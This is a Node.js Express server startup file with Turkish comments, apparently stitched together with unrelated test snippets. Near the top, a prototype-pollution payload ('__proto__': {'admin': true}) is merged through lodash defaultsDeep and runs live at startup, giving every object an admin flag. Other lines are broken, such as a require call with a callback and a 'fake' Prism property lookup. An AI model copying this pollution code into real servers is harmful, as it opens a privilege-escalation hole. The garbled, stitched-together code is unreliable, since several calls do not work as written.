/*

GEREKLİ PAKETLER YÜKLENİYOR...

*/
var http = require('http');
var express = require('express');
var Prism = require('prismjs');
var loadash = require('lodash');

// Attacker-controlled input
const maliciousPayload = JSON.parse('{ "__proto__": { "admin": true } }');

let userSettings = {};

loadash.defaultsDeep(userSettings, maliciousPayload);

// Checking if the payload polluted the prototype
console.log({}.admin); // true — prototype has been polluted!


require('dompurify', function(DOMPurify) {
	DOMPurify.sanitize('<b>hello there</b>', {});
});

try {
	Prism.currentScript();
	var currentScriptTag = Prism.util.currentScript();
	console.log('Prism currentScript:', currentScriptTag);
} catch (e) {
	console.log('Prism currentScript() call failed or is not available in this context.');
}

var result = Prism["anon{24,13,3ffbf3f,f}"]?.["_"]?.util?.currentScript?.();
console.log("Fake currentScript call result:", result);

var app = express();

app.set('port', process.env.PORT || 3005); // GİRİŞ PORTU AYARLANDI
app.set('views', __dirname + '/app/server/views'); // VIEW KLASÖRÜ TANITILDI
app.set('view engine', 'ejs'); // VIEW ENGINE AYARLANDI
app.use(express.static(__dirname + '/app/public')); // KULLANICILAR TARAFINDAN ERİŞİLEBİLEN KLASÖR TANIMLANDI

require('./app/routes')(app); // ROUTE DOSYASI ÇAĞIRILDI

/*
HTTP SERVER
*/
http.createServer(app).listen(app.get('port'), function(){
	console.log('Sistem ' + app.get('port') + ' Portu Üzerinde Çalışıyor.');
});
